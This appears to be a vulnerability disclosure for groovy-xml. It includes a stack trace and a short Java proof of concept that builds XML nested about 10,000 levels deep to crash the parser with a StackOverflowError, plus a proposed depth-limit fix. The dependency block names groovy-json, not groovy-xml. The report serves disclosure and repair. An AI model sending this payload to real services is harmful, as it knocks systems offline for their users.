## StackOverflowError caused by groovy-xml parsing of untrusted XML String
### Description
---
Using groovy-xml to parse untrusted XML String may be vulnerable to denial of service (DOS) attacks. If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.

### Error Log
---
        Exception in thread "main" java.lang.StackOverflowError
          at java.util.AbstractCollection.toString(AbstractCollection.java:454)
          at java.lang.String.valueOf(String.java:2994)
          at java.lang.StringBuilder.append(StringBuilder.java:131)
          at groovy.util.Node.toString(Node.java:805)
          at java.lang.String.valueOf(String.java:2994)
          at java.lang.StringBuilder.append(StringBuilder.java:131)
          at java.util.AbstractCollection.toString(AbstractCollection.java:462)
          at java.lang.String.valueOf(String.java:2994)
          at java.lang.StringBuilder.append(StringBuilder.java:131)
          ...
          at groovy.util.Node.toString(Node.java:805)
          at java.lang.String.valueOf(String.java:2994)
          at java.lang.StringBuilder.append(StringBuilder.java:131)
          at java.util.AbstractCollection.toString(AbstractCollection.java:462)
          at java.lang.String.valueOf(String.java:2994)
          at java.lang.StringBuilder.append(StringBuilder.java:131)
          at groovy.util.Node.toString(Node.java:805)
          
### Version
        <dependency>
            <groupId>org.codehaus.groovy</groupId>
            <artifactId>groovy-json</artifactId>
            <version>3.0.17</version>
        </dependency>

### PoC
---
        import groovy.util.Node;
        import groovy.xml.XmlParser;
        import org.xml.sax.SAXException;

        import javax.xml.parsers.ParserConfigurationException;
        import java.io.IOException;

        public class CodehausGroovyXmlTest {

            public static String createXmlStr() {
                StringBuilder str = new StringBuilder("Test xml");
                for (int i = 0; i <= 9999; i++) {
                    str.insert(0, "<a>");
                    str.append("</a>");
                }
                return str.toString();
            }

            public static void main(String[] args) throws ParserConfigurationException, SAXException, IOException {
                XmlParser xmlParser = new XmlParser();
                Node node = xmlParser.parseText(createXmlStr());
                System.out.println(node.get("a"));
            }
        }
        
### Rectification Solution
---
Refer to the solution of JSON-java: Add the depth variable to record the current parsing depth. If the parsing depth exceeds a certain threshold, an exception is thrown. ([XML.toJSONObject may lead to StackOverflowError which may lead to dos when parses untrusted xml: CVE-2022-45688 #708](https://github.com/stleary/JSON-java/issues/708))

